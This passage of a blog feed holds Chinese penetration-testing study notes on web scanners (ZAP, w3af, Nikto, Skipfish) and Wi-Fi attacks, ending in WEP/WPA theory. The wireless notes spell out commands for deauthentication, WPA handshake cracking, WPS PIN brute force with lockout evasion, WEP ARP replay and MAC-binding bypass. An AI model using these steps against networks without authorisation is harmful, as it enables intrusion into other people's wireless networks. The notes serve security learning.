      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web扫描工具-Arachni</title>
      <link href="/posts/abac1e51.html"/>
      <url>/posts/abac1e51.html</url>
      
        <content type="html"><![CDATA[<h3 id="Arachni"><a href="#Arachni" class="headerlink" title="Arachni"></a>Arachni</h3><ul><li><p>官网</p><ul><li><a href="https://www.arachni-scanner.com/" target="_blank" rel="noopener">https://www.arachni-scanner.com/</a></li></ul></li><li><p>支持分布式扫描</p></li><li><p>支持调度，每隔多久扫描一次</p></li><li><p>安装后，输入用户名密码登录提示错误，google发现很多人有同样错误，暂时无解。</p></li></ul><a id="more"></a><h3 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP_ZAP"></a>OWASP_ZAP</h3><ul><li>Zed attack proxy</li><li>WEB Application继承渗透测试和漏洞挖掘工具</li><li>开源免费快平台简单易用</li><li>截断代理</li><li>主动、被动扫描</li><li>Fuzzy、暴力破解</li><li>API<ul><li><a href="http://zap/" target="_blank" rel="noopener">http://zap/</a></li></ul></li><li>功能<ul><li><code>netstat -pantu</code>发现zap自动在8080端口打开 代理，通过该代理访问的网页会显示在zap中</li><li>Mode–Safe、Protected、Standard、ATTACK</li><li>升级add-ons</li><li>ScanPolicy</li><li>Anti CSRF Tokens</li><li>https–CA<ul><li>把ZAP的证书导入到浏览器成信任的证书</li><li>在设置的Dynamic SSL Certificates里面</li></ul></li><li>Scope/Context/filter</li><li>Http Sessions</li><li>扫描结果可以添加Note/Tag</li><li>小绿点：截断。小灯泡：显示隐藏域。</li></ul></li></ul><h4 id="扫描工作流程"><a href="#扫描工作流程" class="headerlink" title="扫描工作流程"></a>扫描工作流程</h4><ul><li>设置代理</li><li>手动爬网</li><li>自动爬网</li><li>主动扫描</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web扫描工具-w3af</title>
      <link href="/posts/aaf72ae0.html"/>
      <url>/posts/aaf72ae0.html</url>
      
        <content type="html"><![CDATA[<h2 id="w3af"><a href="#w3af" class="headerlink" title="w3af"></a>w3af</h2><ul><li>Web Application Attack and Audit Framework,基于python语言开发</li><li>此框架的目标是帮助你发现和利用所有WEB应用程序漏洞</li><li>9大类近150个plugin<ul><li>audit</li><li>infrastructure</li><li>grep</li><li>evasion</li><li>mangle 正则替换</li><li>auth</li><li>bruteforce</li><li>output</li><li>crawl</li></ul></li></ul><a id="more"></a><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>cd ~<br>apt-get install -y python-pip<br>pip install –upgrade pip<br>git clone https/github.com/andresriancho/w3af.git<br>cd w3af<br>./w3af_console<br>. /tmp/w3af_dependency_install.sh</p><p>此时w3af_console可用，但是w3af_gui还有问题</p><p>安装python-webkit</p><ul><li><p>wget <a href="http://ftp.br.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit_1.1.8-3_amd64.deb" target="_blank" rel="noopener">http://ftp.br.debian.org/debian/pool/main/p/pywebkitgtk/python-webkit_1.1.8-3_amd64.deb</a></p><ul><li><p>wget <a href="http://ftp.br.debian.org/debian/pool/main/w/webkitgtk/libjavascriptcoregtk-1.0-0_2.4.11-3_amd64.deb" target="_blank" rel="noopener">http://ftp.br.debian.org/debian/pool/main/w/webkitgtk/libjavascriptcoregtk-1.0-0_2.4.11-3_amd64.deb</a></p><ul><li>从<a href="http://ftp.de.debian.org/debian/pool/main/i/icu/" target="_blank" rel="noopener">http://ftp.de.debian.org/debian/pool/main/i/icu/</a> 下载libicu57</li></ul></li><li><p>wget <a href="http://ftp.br.debian.org/debian/pool/main/p/python-support/python-support_1.0.15_all.deb" target="_blank" rel="noopener">http://ftp.br.debian.org/debian/pool/main/p/python-support/python-support_1.0.15_all.deb</a></p><ul><li>补全python库环境</li></ul></li></ul></li><li><p><code>apt install python-dev build-essential libssl-dev libffi-dev libxml2-dev libxslt1-dev zlib1g-dev</code></p><ul><li>``````apt –fix-broken install```</li></ul><ul><li><p>wget <a href="http://ftp.br.debian.org/debian/pool/main/w/webkitgtk/libwebkitgtk-1.0-0_2.4.11-3_amd64.deb" target="_blank" rel="noopener">http://ftp.br.debian.org/debian/pool/main/w/webkitgtk/libwebkitgtk-1.0-0_2.4.11-3_amd64.deb</a></p><ul><li><code>apt-get install libegl1-mesa</code></li></ul></li><li><p><code>apt-get install libegl1-x11</code></p></li><li><p>最后安装webkit还有问题，libpango1.0-0 python-gek2 not installed 用下面的方法解决</p><ul><li><code>sudo apt-get install --reinstall python</code></li></ul></li><li><p><code>apt --fix-broken install</code></p></li></ul></li><li><p>python-webkit安装好后执行./tmp/w3af_dependency_install.sh。报没有python-gtksourceview2</p><ul><li><a href="https://packages.debian.org/stretch/amd64/python-gtksourceview2/download" target="_blank" rel="noopener">https://packages.debian.org/stretch/amd64/python-gtksourceview2/download</a> 这里下载<ul><li>安装时依赖 libgtksourceview2.0-0</li></ul></li></ul></li><li><p>python-pip 等需要安装什么 直接搜 xxx deb，就有可以下载的地方</p></li></ul><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><ul><li>help一下就知道了- -</li><li>可以把命令写程一个脚本 直接<code>w3af_consol -s xxx.w3af</code></li></ul><h4 id="w3af身份认证"><a href="#w3af身份认证" class="headerlink" title="w3af身份认证"></a>w3af身份认证</h4><ul><li>http basic<ul><li>Authorization：basic</li><li>路由器就是这种， 字段，base64编码，抓包就可以直接看到用户名密码。</li></ul></li><li>ntlm<ul><li>http头Authorization：ntlm</li><li>微软专有的身份认证：<ul><li>首次GET，服务器会返回401此时在浏览器弹出输入框</li><li>输入点击确认后，会再次发起GET附带messg1</li><li>服务器返回401附带messg2，其中包含1个随机数</li><li>浏览器再次发起GET请求，附带messg3,包含加密后的随机数密文</li><li>服务端返回登陆结果</li></ul></li><li>参考博客：<a href="https://www.cnblogs.com/huangyong9527/articles/1844553.html" target="_blank" rel="noopener">https://www.cnblogs.com/huangyong9527/articles/1844553.html</a></li></ul></li><li>form<ul><li>基于表单的身份认证</li><li>图形界面操作</li></ul></li><li>Cookie<ul><li>双因素身份认证/anti-CSRF tokens</li><li>注意格式</li></ul></li><li>利用HTTP头完成身份认证</li></ul><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>xxx略- -</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web扫描工具-Nikto、Vega、Skipfish</title>
      <link href="/posts/b6ffa781.html"/>
      <url>/posts/b6ffa781.html</url>
      
        <content type="html"><![CDATA[<h3 id="WEB攻击面"><a href="#WEB攻击面" class="headerlink" title="WEB攻击面"></a>WEB攻击面</h3><ul><li>Network</li><li>OS</li><li>Web Server</li><li>App Server</li><li>Web Application</li><li>Database</li><li>Browser</li></ul><a id="more"></a><h3 id="协议基础"><a href="#协议基础" class="headerlink" title="协议基础"></a>协议基础</h3><ul><li>明文<ul><li>无内建的机密安全机制</li><li>嗅探或代理截断可查看全部明文信息</li><li>https只能提高传输层安全</li></ul></li><li>无状态<ul><li>每一次客户端和服务端的通信都是独立的过程</li><li>WEB应用需要跟踪客户端会话（多步通信）</li><li>不使用cookie的应用，客户端每次请求都要重新身份验证</li><li>Session用于在用户身份验证后跟踪用户行为轨迹<ul><li>提高用户体验，但增加了攻击向量</li></ul></li></ul></li><li>Cycle<ul><li>请求/响应</li></ul></li><li>重要的header<ul><li>响应头：<ul><li>Set-Cookie：服务器发给客户端的SessionID(被窃取的风险)</li><li>Content-Length：响应body部分的字节长度(爆破时通过该字段判断页面变化)</li><li>Location：重定向用户到另一个页面，可识别身份认证后允许访问的页面</li></ul></li><li>请求头：<ul><li>Cookie：客户端发回给服务器证明用户状态的信息（头-值，成对出现）</li><li>Referrer：发起新请求之前用户位于那个页面，服务器基于此头的安全限制很容易被修改绕过</li></ul></li></ul></li><li>状态码：<ul><li>100s、200s、300s、400s、500s</li></ul></li></ul><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>Metasploitable<ul><li>Dvwa</li></ul></li></ul><h3 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h3><ul><li>Httrack<ul><li>将web上所有可访问的页面都copy下来</li><li>减少与目标系统交互</li></ul></li></ul><h3 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h3><h4 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h4><ul><li>perl语言开发的开源web安全扫描器</li><li>web服务器使用的软件版本</li><li>搜索存在安全隐患的文件</li><li>服务器配置漏洞</li><li>WEB Application层面的安全隐患</li><li>避免404误判<ul><li>很多服务器不遵守RFC标准，对于不存在的对象返回200</li><li>依据响应文件内容判断，不同拓展名的404文件响应内容不同</li><li>去除时间信息后的内容取MD5值</li><li>-no404</li></ul></li><li><a href="https://cirt.net/Nikto2" target="_blank" rel="noopener">https://cirt.net/Nikto2</a></li><li>操作：<ul><li><code>nikto -list-plugins</code></li><li><code>nikto -host http://1.1.1.1</code></li><li><code>nikto -host 192.168.1.1 -ssl -port 443,8443,995</code></li><li><code>nikto -host host.txt</code></li><li><code>nmap -p80 102.168.1.0/24 -oG -|nikto -host -</code></li><li><code>nikto -host 192.168.1.1 -useproxy http://localhost:8087</code></li><li><code>-vhost</code></li><li>interative:<ul><li>v -verbose mode on/off</li><li>d -debug mode on/off</li><li>e -error reporting on/off</li><li>p -progress reporting on/off</li><li>P -pause</li><li>r -redirect display on/off</li><li>c -coocie display on/off</li><li>a -auth display on/off</li><li>q -quit</li><li>N -next host</li></ul></li><li>配置文件：etc/nikto.conf<ul><li>修改UserAgent</li><li>STATIC-COOKIE=”cookie1=value”;”cookie2=value”</li></ul></li><li>-evasion:使用LibWhisker种对IDS的躲避技术，可以使用一下几种类型<ul><li><ol><li>随机URL编码（非UTF-8）</li><li>子选择路径（/./）</li><li>过早结束的URL</li><li>优先考虑长随机字符串</li><li>参数欺骗</li><li>使用TAB作为命令的分隔符</li><li>使用变化的URL</li><li>使用Windows路径分隔符“\”</li></ol></li></ul></li></ul></li></ul><h4 id="Vega"><a href="#Vega" class="headerlink" title="Vega"></a>Vega</h4><ul><li><p>Java编写的开源Web扫描器</p></li><li><p>扫描模式</p></li><li><p>代理模式</p></li><li><p>爬站、处理表单、注入测试</p></li><li><p>subgraph.com/vega</p></li><li><p>先手动爬，然后跑扫描。</p></li></ul><h4 id="Skipfish"><a href="#Skipfish" class="headerlink" title="Skipfish"></a>Skipfish</h4><ul><li>C语言编写</li><li>实验性的主动web安全评估工具</li><li>递归爬网</li><li>基于字典的探测</li><li>速度较快<ul><li>多路单线程，全异步网络I/O,消除内存管理和调度开销</li><li>启发式自动内容识别</li></ul></li><li>误报较低</li></ul><h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><ul><li><code>skipfish -o test http://1.1.1.1</code></li><li><code>skipfish -o test @url.txt</code></li><li><code>skipfish -o test -S complet.wl -W a.wl http://1.1.1.1</code><ul><li><code>dpkg -L skipfish | grep wl</code>得到skipfish自带的字典</li><li>通过-S指定使用的字典，-W保存爬的过程中发现的特殊字符，目录，到指定字典。</li></ul></li><li>-I （大写i）只检查匹配 ‘string’ 的url</li><li>-X 不检查匹配 ‘string’ 的url</li><li>-K 不对指定参数进行Fuzz测试</li><li>-D 跨站点爬另外一个域，如果有链接连接到这里，就会扫。</li><li>-l (小写L) 每秒最大请求书</li><li>-m 每IP最大并发连接数</li><li>–config 指定配置文件</li><li>身份认证<ul><li><code>skipfish -A user：pass -o test http://1.1.1.1</code></li><li><code>skipfish -C &quot;name=val&quot; -C &quot;name2=value2&quot; -o test http://1.1.1.1</code></li><li>-auth-form -auth-user -auth-pass -auth-verify-url等，查看help</li></ul></li><li>扫描结束太快<ul><li>触发了目标站点的连接数限制，降低-m -l数值</li></ul></li></ul><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul><li>代理：Hidemyass</li><li>书：《Web penetration test with kali Linux》</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线渗透实操-Aircrack-ng-WPA/WPS</title>
      <link href="/posts/2fdad454.html"/>
      <url>/posts/2fdad454.html</url>
      
        <content type="html"><![CDATA[<h2 id="无线渗透实操——Aircrack-ng-WPA-WPS"><a href="#无线渗透实操——Aircrack-ng-WPA-WPS" class="headerlink" title="无线渗透实操——Aircrack-ng(WPA/WPS)"></a>无线渗透实操——Aircrack-ng(WPA/WPS)</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ul><li>启动monitor模式<ul><li><code>airmon-ng start wlan0</code></li></ul></li><li>查看附近无线信息<ul><li><code>airodump-ng wlan0mon</code></li></ul></li><li>开始抓包并保存<ul><li><code>airodump-ng wlan0mon -c&lt;channel&gt; --bssid&lt;bssid&gt; -w&lt;filename&gt;</code></li></ul></li><li>Deauthentication攻击获取四步握手信息<ul><li><code>aireplay-ng -0 &lt;count&gt; -a &lt;ap mac&gt; -c &lt;sta mac&gt; wlan0mon</code></li></ul></li><li>字典暴破<ul><li><code>aircrack-ng -w /user/share/john/password.list wpa-01.cap</code></li></ul></li></ul><a id="more"></a><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><ul><li>网上共享的字典</li><li>数据泄露</li><li>地区电话号码字段</li><li>Crunch生成</li><li>Kali中自带的</li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul><li>Essid+PSK+迭代次数4096——Hash计算生成PMK（十分消耗CPU时间）</li><li>PMK+Anounce+Snounce+MAC1+MAC2计算出PTK</li></ul><h3 id="Airolib"><a href="#Airolib" class="headerlink" title="Airolib"></a>Airolib</h3><ul><li>先计算生成所有的PMK（计算资源消耗）</li><li>PMK在破解阶段被用于计算PTK（速度快，计算资源要求少）</li><li>通过完整性摘要值找到正确的PTK，再找到生成该PTK的PMK及相应的PSK</li><li>SQLite3数据库存储数据</li></ul><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ul><li><code>airolib-ng db --import essid essid.txt</code></li><li><code>airolib-ng db --stats</code></li><li><code>airolib-ng db --import passwd /usr/share/wordlists/rockyou.txt</code></li><li><code>airolib-ng db --batch</code> 计算PMK</li><li><code>aircrack-ng -r db wpa-02.cap</code></li></ul><h3 id="John-the-ripper"><a href="#John-the-ripper" class="headerlink" title="John the ripper"></a>John the ripper</h3><ul><li>快速的密码破解软件</li><li>支持基于规则动态生成密码字典</li><li>很多人喜欢用手机号做无线密码<ul><li>获取号段并动态增加后几位数字</li></ul></li><li>配置文件/etc/john/john.conf<ul><li>[List.Rules:Wordlist]</li><li>$[0-9]$[0-9]$[0-9]$[0-9]</li></ul></li><li><code>john --wordlist=yidong.txt --rules --stdout | aircrack-ng -e kifi -w - wpa-01.cap</code></li></ul><h3 id="Cowpatty"><a href="#Cowpatty" class="headerlink" title="Cowpatty"></a>Cowpatty</h3><ul><li>同样用字典生成彩虹表再爆破</li></ul><h3 id="Pyrit"><a href="#Pyrit" class="headerlink" title="Pyrit"></a>Pyrit</h3><ul><li>与airolib、cowpatty相同、支持基于预计算的PMK提高破解速度</li><li>独有的优势<ul><li>可以利用GPU</li><li>本身支持抓包获取四步握手，无需使用Airodump</li><li>支持读取airodump抓包获取四步握手的方式</li></ul></li><li>只抓WAP四次握手过程包<ul><li><code>pyrit -r wlan0mon -o wpapyrit.cap stripLive</code></li><li><code>pyrit -r wpapyrit.cap analyze</code></li></ul></li><li>从airodump抓包导入并筛选<ul><li><code>pyrit -r wpa.cap -o wpapyrit.cap strip</code></li></ul></li><li>使用密码直接破解<ul><li><code>pyrit -r wpapyrit.cap -i password.list -b&lt;AP MAC&gt; attack passthrough</code></li></ul></li><li>数据库模式破解<ul><li>默认使用基于文件的数据库，支持连接SQL数据库，将计算的PMK存入数据库</li><li>查看默认数据库状态:<code>pyrit eval</code></li><li>导入密码字典：<code>pyrit -i password.list import passwords</code></li><li>指定ESSID：<code>pyrit -e kifi create essid</code></li><li>计算PMK：<code>pyrit batch</code>(发挥GPU计算能力)</li><li>破解密码：<code>pyrit -r wpapyrit.cap -b &lt;AP MAC&gt; attack db</code></li></ul></li></ul><h2 id="WPS-Wireless-Protected-Setup"><a href="#WPS-Wireless-Protected-Setup" class="headerlink" title="WPS(Wireless Protected Setup)"></a>WPS(Wireless Protected Setup)</h2><ul><li>WPS是WiFi联盟2006年开发的一项技术<ul><li>通过PIN码来简化无线接入的操作，无需记住PSK</li><li>路由器和网卡各按一个按钮就能接入无线</li><li>PIN码是分为前后各4位的2段共8位数字</li></ul></li><li>安全漏洞<ul><li>2011年被发现安全涉及漏洞</li><li>接入发起方可以根据路由器的返回信息判断前四位是否正确</li><li>而PIN码的后4位只有1000种定义的组合（最后一位是checksum）</li><li>所以全部穷举破解只需要11000次尝试<ul><li>PSK：218340105584896次</li></ul></li><li>标准本身没有设计锁定机制，目前多个厂商已经实现锁定机制。</li></ul></li></ul><h4 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h4><ul><li>启动侦听模式，发现支持WPS的AP<ul><li><code>wash -C -i wlan0mon</code></li><li><code>airodump-ng wlan0mon --wps</code></li></ul></li><li>爆破pin码<ul><li><code>reaver -i wlan0mon -b &lt;AP MAC&gt; -vv -c &lt;channel&gt;</code> </li></ul></li><li>秒破PIN<ul><li><code>reaver -i wlan0mon -b &lt;AP MAC&gt; -vv -K 1</code></li><li>上面的命令其实调用的是<code>pixiewps</code></li><li>只适用于固定厂商的芯片，成功率低</li></ul></li><li>从pin码获得密码<code>reaver -i wlan0mon -b &lt;AP MAC&gt; -vv -p 88888888</code></li><li>问题：<ul><li>很多厂家实现了锁定机制，所以爆破时应注意限速</li><li>一旦触发锁定，可尝试耗尽AP连接数，令其重启并解除WPS锁定</li></ul></li><li>综合自动化无线密码破解工具wifite</li></ul><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>插入网卡前先执行</p><ul><li><code>service NetworkManager stop</code></li><li><code>airmon-ng check kill</code></li></ul><p>否则插入网卡后wpa_supplicant会对网卡进行初始化，导致操作失败</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线渗透实操--Aircrack-ng:WEP</title>
      <link href="/posts/67e16c9.html"/>
      <url>/posts/67e16c9.html</url>
      
        <content type="html"><![CDATA[<h2 id="无线渗透实操——Aircrack-ng-WEP"><a href="#无线渗透实操——Aircrack-ng-WEP" class="headerlink" title="无线渗透实操——Aircrack-ng(WEP)"></a>无线渗透实操——Aircrack-ng(WEP)</h2><h3 id="Airmon-ng"><a href="#Airmon-ng" class="headerlink" title="Airmon-ng"></a>Airmon-ng</h3><ul><li><code>airmon-ng start wlan0</code> wlan0开启侦听模式，可以在后面加数字表示在某个信道开启</li><li><code>iwlist wlan2mon channel</code>查看网卡工作在哪个信道</li><li><code>airmon-ng stop wlan0mon</code>关闭侦听模式，重新开启managed模式</li><li><code>airmon-ng check kill</code>关闭影响aircrack-ng的进程</li></ul><a id="more"></a><h3 id="Airodump-ng"><a href="#Airodump-ng" class="headerlink" title="Airodump-ng"></a>Airodump-ng</h3><ul><li><p><code>airodump-ng wlan0mon</code>开启hook模式，会显示附近的AP和STA及相关信息</p><ul><li><p>-c 参数工作在指定信道，否则是所有信道。</p></li><li><p>–bssid 3C:A5:81:28:34:24 指定bssid</p></li><li><p>-w 抓包结果写入某个文件</p></li><li><p>–ivs 只会抓wep中存有ivs的数据包</p></li><li><p>抓包结果：<img src="/posts/67e16c9/pic01.png" alt="截图"></p><ul><li>BSSID：Ap的MAC地址</li><li>PWR：网卡接收到的信号强度，距离越近，信号越强<ul><li>-1：驱动不支持信号强度，STA距离超出信号接受范围</li></ul></li><li>RXQ：最近10秒成功接收的数据帧的百分比（数据帧，管理帧），只有在固定信道时才会出现</li><li>Beacons：AP发出的beacon帧数量</li><li>#Data：抓到的数据帧数量</li><li>#/s：最近10秒内，平均每秒抓到的帧的数量</li><li>CH：信道号（从beacon帧中获得），当信道重叠时可能发现其它信道的AP</li><li>MB：AP支持的最大速率</li><li>ENC：采用的无线安全技术：WEP、WPA、WPA2、OPEN</li><li>CIPHER：采用的加密套件：CCMP、TKIP、WEP40、WEP104</li><li>AUTH：身份认证方法MGT、PSK、SKA、OPEN</li><li>ESSID:无线网络名称，隐藏AP此值可能为空，airodump从probe和association request帧中发现隐藏AP</li><li>STATION：STA的MAC地址</li><li>Lost：通过sequence number判断最近10秒station丢包数量<ul><li>干扰（微波炉）、距离</li><li>发包不能收，收包不能发</li></ul></li><li>Frames：STA发送的数据包数量</li><li>Probes：STA发送的prob帧</li></ul></li></ul></li></ul><h3 id="Aireplay-ng"><a href="#Aireplay-ng" class="headerlink" title="Aireplay-ng"></a>Aireplay-ng</h3><ul><li><p>产生或者加速无线通信流量</p><ul><li>向无线网络中注入数据包<ul><li>伪造身份验证</li><li>强制重新身份验证</li><li>抓包重放</li></ul></li><li>用于后续WEP和WPA密码破解</li><li>支持10种包注入</li></ul></li><li><p>获取包的两种途径</p><ul><li>指定接口（-i）</li><li>抓包文件pcap（-r）</li></ul></li><li><p>aireplay-ng &lt;options&gt;&lt;interface name&gt;</p></li><li><p>Filter命令选项（除0、1两种攻击方式）</p></li></ul><h4 id="修改mac地址"><a href="#修改mac地址" class="headerlink" title="修改mac地址"></a>修改mac地址</h4><ul><li>kali可以直接在操作系统图形界面修改，参考下面”MAC绑定绕过“</li><li>也可以命令行修改，不过用这种方式在kali修改后，连接wifi会被NetworkManager再次改回去- -。</li></ul><figure class="hljs highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">ifconfig wlan0mon down<br>macchanger -m 00:11:11:11:11:11 wlan0mon<br>ifconfig wlan0mon up<br></code></pre></td></tr></table></figure><h4 id="测试网卡注入"><a href="#测试网卡注入" class="headerlink" title="测试网卡注入"></a>测试网卡注入</h4><ul><li><p><code>aireplay-ng -9 wlan0mon</code></p></li><li><p><code>aireplay-ng -9 -e xxxx -a mac:mac:x:x:x:x wlan0mon</code></p></li></ul><h3 id="MAC绑定绕过"><a href="#MAC绑定绕过" class="headerlink" title="MAC绑定绕过"></a>MAC绑定绕过</h3><ul><li><p><code>airmon-ng stop wlan0mon</code> 先关闭之前的监听</p></li><li><p><code>airmon-ng start wlan0 9</code> 在指定信道上开启</p></li><li><p><code>airodump-ng wlan0mon -c 9</code> airodump-ng监听</p><ul><li>–bissid指定AP</li></ul></li><li><p>在Kali右键NetworkManager–&gt;edit Connections–&gt;要连接的网络–&gt;Wi-Fi–&gt;Cloned MAC address–&gt;填入已经连接上AP的mac</p></li><li><p>重新连接该网络，发现可以连接上。此时网络质量很差，因为两个STA都可以接收到对方的数据包。当其中一个mac下线后，另一个就可以正常上网。</p></li></ul><h3 id="WEP攻击"><a href="#WEP攻击" class="headerlink" title="WEP攻击"></a>WEP攻击</h3><h4 id="WEP共享密钥破解"><a href="#WEP共享密钥破解" class="headerlink" title="WEP共享密钥破解"></a>WEP共享密钥破解</h4><ul><li><p>WEP密码破解原理</p><ul><li>IV并非完全随机</li><li>每2的24次方个包可能出现一次IV重用</li><li>收集大量IV之后找出相同IV集齐对应密文，分析得出共享密码</li></ul></li><li><p>ARP回包中包含IV</p></li><li><p>IV足够多的情况下，任何复杂程度的WEP密码都可以被破解。</p></li><li><p>流程：</p><ul><li>启动monitor模式</li><li>启动抓包并保存抓包<ul><li><code>airodump-ng wlan0mon -c&lt;channel&gt; --bssid&lt;bssid&gt; -w&lt;filename&gt;</code></li></ul></li><li>Deauthentication触发一次其它STA的连接过程，抓包计算出keystream,即XOR文件。（用来加密AP发来的challenge，与AP建立关联需要指定XOR文件）<ul><li><code>aireplay-ng -0 &lt;count&gt; -a &lt;ap mac&gt; -c &lt;sta mac&gt; wlan0mon</code></li><li>攻击过程中信号强度PWR为0</li></ul></li><li>利用XOR文件与AP建立关联(建立关联后才能执行之后的操作)<ul><li><code>aireplay-ng -1 60 -y xor -a apmac -h mymac wlan0mon</code></li></ul></li><li>执行ARP重放<ul><li>目的是收集IV值</li><li>64位20w,128位150w数据，效率较高。（实际上十几w,几秒钟就破解了）</li><li>开始发送ARP包<code>aireplay-ng -3 -b apmac -h mymac wlan0mon</code></li><li>Deauthentication触发ARP数据包<code>aireplay-ng -0 2 -a apmac -c stamac wlan0mon</code></li></ul></li><li>收集足够DATA后破解密码,可以边抓包边破解<ul><li>aircrack-ng wep-01.cap</li><li>破解完成</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEP/WPA工作原理</title>
      <link href="/posts/8ebcc27a.html"/>
      <url>/posts/8ebcc27a.html</url>
      
        <content type="html"><![CDATA[<h2 id="WEP-WPA工作原理"><a href="#WEP-WPA工作原理" class="headerlink" title="WEP/WPA工作原理"></a>WEP/WPA工作原理</h2><h3 id="WEP加密"><a href="#WEP加密" class="headerlink" title="WEP加密"></a>WEP加密</h3><ul><li>使用Rivest Cipher4（RC4）算法加密流量内容，实现机密性</li><li>CRC32算法检查数据完整性</li><li>标准采用使用24位initialization vector（IV）</li></ul><a id="more"></a><h4 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h4><ul><li>RSA实验室研发的对称加密流算法<ul><li>实现简单</li><li>速度快</li></ul></li><li>加密：对明文流和密钥流进行XOR计算</li><li>解密：对密文流和密钥流进行XOR计算</li><li>RC4算法key由两个过程生成<ul><li>合并IV和PSK，利用Key Scheduling Algorithm（KSA）算法生成起始状态表。</li><li>Pseudo-Random Generation Algorithm（PRGA）算法生成最终密钥流。</li></ul></li></ul><h3 id="WPA安全系统"><a href="#WPA安全系统" class="headerlink" title="WPA安全系统"></a>WPA安全系统</h3><ul><li>Wi-Fi Protected Access</li><li>802.11i为提高无限安全，开发两个新的链路层加密协议<ul><li>Temporal Key Integrity Protocol(TKIP)<ul><li>WPA1(较之WEP可动态改变密钥)</li></ul></li><li>Counter Mode with CBC-MAC(CCMP)<ul><li>WPA2</li></ul></li></ul></li><li>WPA加密两种安全类型<ul><li>WPA个人：使用预设共享密钥实现身份认证</li><li>WPA企业：使用802.1x和Radius服务器实现AAA<ul><li>从客户端到AP用EAP协议</li></ul></li></ul></li><li>WPA1<ul><li>802.11i第三版草案</li><li>与WEP比较<ul><li>都采用逐包进行密钥加密</li><li>128位的key和48位的初向量（IV）</li><li>RC4流加密数据</li><li>帧计数器避免重放攻击</li><li>TKIP使用Michael算法进行完整性校验MIC<ul><li>WEP CRC32</li></ul></li><li>兼容早期版本硬件</li></ul></li></ul></li><li>WPA2<ul><li>依据802.11i完全重新设计实现<ul><li>也被称为Robust Security Network（RSN）</li><li>CCMP替代TKIP</li><li>AES加密算法取代了RC4</li><li>不兼容早期版本硬件</li></ul></li></ul></li></ul><h3 id="身份认证（WPA企业）"><a href="#身份认证（WPA企业）" class="headerlink" title="身份认证（WPA企业）"></a>身份认证（WPA企业）</h3><ul><li>身份认证基于Extensible Authentication Protocol（EAP实现）<ul><li>EAP-TLS，需要客户端和服务器证书</li><li>EAP-TTLS</li><li>PEAP混合身份验证，只需要服务器证书</li></ul></li><li>客户端选择身份认证方式</li><li>AP发送身份验证信息给RadiusServer</li><li>Radius Server返回”Radius Accept“表示认证成功<ul><li>其中包含MasterKey（MK）</li></ul></li><li>AP通过EAP消息通知STA认证成功</li></ul><h3 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a>密钥交换</h3><ul><li><p>无线网络设计用于一组无线通信设备</p><ul><li>关联到同一AP的设备共享无线信道</li><li>单播、广播、组播<ul><li>安全特性要求不同</li><li>单播通信需要单独密钥加密通信双方流量<ul><li>pairwise key：对偶密钥（PTK）（T是temporary，PTK由PMK得出）</li></ul></li><li>组播通信需要信任域内所有成员共享的同一密钥<ul><li>group key：组密钥（GTK）</li></ul></li></ul></li></ul></li></ul><h4 id="PMK"><a href="#PMK" class="headerlink" title="PMK"></a>PMK</h4><ul><li><p>安全上下文的顶级密钥</p><ul><li>MK进行TLS-PRF加密得出PMK<ul><li>基于服务密钥</li></ul></li></ul></li><li><p>由上层身份验证方法服务器生成</p></li><li><p>从服务器通过radius传给AP</p></li><li><p>从AP通过EAP消息传递给所有STA</p><ul><li>基于PSK共享密钥（个人）</li></ul></li><li><p>Essid+PSK+迭代次数4096——Hash计算生成PMK——再生成PTK</p></li><li><p>STA和AP分别计算得出PMK，并不在网络中传递交换</p><ul><li>256位既32字节</li></ul><h4 id="四步握手生成PTK"><a href="#四步握手生成PTK" class="headerlink" 